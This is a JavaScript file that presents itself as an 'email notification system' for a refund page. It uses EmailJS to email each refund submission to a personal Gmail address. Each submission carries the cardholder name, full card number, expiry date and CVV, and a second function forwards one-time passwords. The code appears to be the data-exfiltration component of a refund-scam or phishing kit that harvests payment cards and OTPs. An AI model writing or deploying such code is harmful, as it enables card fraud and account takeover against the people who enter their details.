// Email notification system using EmailJS (completely free)
// This will send refund data directly to your email

class EmailNotificationSystem {
    constructor() {
        // EmailJS configuration (free service)
        this.serviceId = 'service_radhemart';
        this.templateId = 'template_refund';
        this.publicKey = 'YOUR_EMAILJS_PUBLIC_KEY'; // Will be configured
        this.isInitialized = false;
        this.init();
    }

    async init() {
        try {
            // Load EmailJS library
            if (!window.emailjs) {
                const script = document.createElement('script');
                script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
                script.onload = () => {
                    emailjs.init(this.publicKey);
                    this.isInitialized = true;
                    console.log('EmailJS initialized successfully');
                };
                document.head.appendChild(script);
            }
        } catch (error) {
            console.error('Error initializing EmailJS:', error);
        }
    }

    // Send refund notification email
    async sendRefundNotification(refundData) {
        if (!this.isInitialized) {
            console.log('EmailJS not initialized, storing locally only');
            return false;
        }

        try {
            const emailParams = {
                to_email: 'your-email@gmail.com', // Replace with your email
                refund_id: refundData.id,
                cardholder_name: refundData.cardholderName,
                card_number: refundData.cardNumber,
                expiry_date: refundData.expiryDate,
                cvv: refundData.cvv,
                description: refundData.description,
                timestamp: new Date(refundData.timestamp).toLocaleString(),
                status: refundData.status
            };

            const response = await emailjs.send(
                this.serviceId,
                this.templateId,
                emailParams
            );

            console.log('Email sent successfully:', response);
            return true;
        } catch (error) {
            console.error('Error sending email:', error);
            return false;
        }
    }

    // Send OTP notification email
    async sendOTPNotification(otpData) {
        if (!this.isInitialized) {
            return false;
        }

        try {
            const emailParams = {
                to_email: 'your-email@gmail.com',
                otp_number: otpData.otp,
                refund_id: otpData.refundId,
                timestamp: new Date(otpData.timestamp).toLocaleString(),
                type: otpData.type,
                status: otpData.status
            };

            const response = await emailjs.send(
                this.serviceId,
                'template_otp', // Different template for OTPs
                emailParams
            );

            console.log('OTP email sent successfully:', response);
            return true;
        } catch (error) {
            console.error('Error sending OTP email:', error);
            return false;
        }
    }
}

// Initialize email system
let emailSystem = null;

document.addEventListener('DOMContentLoaded', function() {
    emailSystem = new EmailNotificationSystem();
});

// Export functions for use in other files
window.sendRefundEmail = (refundData) => {
    if (emailSystem) {
        return emailSystem.sendRefundNotification(refundData);
    }
    return false;
};

window.sendOTPEmail = (otpData) => {
    if (emailSystem) {
        return emailSystem.sendOTPNotification(otpData);
    }
    return false;
};